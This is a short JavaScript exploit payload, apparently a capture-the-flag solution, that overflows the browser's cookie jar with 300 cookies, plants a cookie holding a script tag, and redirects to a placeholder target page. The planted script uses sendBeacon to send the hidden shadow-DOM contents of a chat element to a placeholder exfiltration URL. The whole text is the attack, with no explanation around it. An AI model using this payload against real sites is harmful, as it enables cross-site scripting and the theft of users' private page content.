[...Array(300).keys()].forEach((i)=>document.cookie=`${i}=${i}`);
document.cookie="present=<script>setTimeout(()=>navigator.sendBeacon('EXFIL_URL',document.getElementsByTagName('inputless-chat')[0].shadowRoot.innerHTML),400)</script>";
window.location="TARGET_URL/fraternize";
